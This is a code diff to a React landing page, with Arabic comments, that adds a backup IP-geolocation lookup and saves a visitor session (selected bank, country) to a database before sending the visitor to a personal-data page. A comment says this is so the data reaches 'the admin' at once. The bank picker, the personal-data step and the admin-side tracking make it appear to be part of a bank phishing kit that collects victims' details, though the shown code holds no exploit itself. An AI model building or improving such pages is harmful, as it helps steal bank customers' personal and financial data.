@@ -40,15 +40,31 @@ export default function Home() {
     : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";
 
   useEffect(() => {
-    // جلب دولة المستخدم تلقائياً
-    fetch("https://ipapi.co/json/")
-      .then(res => res.json())
-      .then(data => {
+    // جلب دولة المستخدم تلقائياً باستخدام أكثر من مصدر لضمان النجاح
+    const fetchCountry = async () => {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
         if (data.country_name) {
           setUserCountry(data.country_name);
+          return;
         }
-      })
-      .catch(err => console.error("Error fetching country:", err));
+      } catch (e) {
+        console.log("ipapi failed, trying backup...");
+      }
+
+      try {
+        const res = await fetch("https://ipwho.is/");
+        const data = await res.json();
+        if (data.country) {
+          setUserCountry(data.country);
+        }
+      } catch (e) {
+        console.error("Backup country fetch failed");
+      }
+    };
+
+    fetchCountry();
 
     const timer = setInterval(() => {
       setCurrentSlide((prev) => (prev + 1) % 2);
@@ -67,15 +83,18 @@ export default function Home() {
     localStorage.setItem("selectedBank", selectedBank);
     
     try {
+      // ننتظر إنشاء الجلسة في قاعدة البيانات قبل الانتقال لضمان وصول البيانات للآدمن فوراً
       await createSessionMutation.mutateAsync({
         sessionId,
         selectedBank,
         country: userCountry,
       });
+      setLocation(`/personal-data?bank=${selectedBank}&session=${sessionId}`);
     } catch (error) {
       console.error("Error creating session in DB:", error);
+      // في حال الفشل، نحاول الانتقال على أي حال مع تنبيه بسيط
+      setLocation(`/personal-data?bank=${selectedBank}&session=${sessionId}`);
     }
-    setLocation(`/personal-data?bank=${selectedBank}&session=${sessionId}`);
   };
 
   const goToPersonalData = () => {
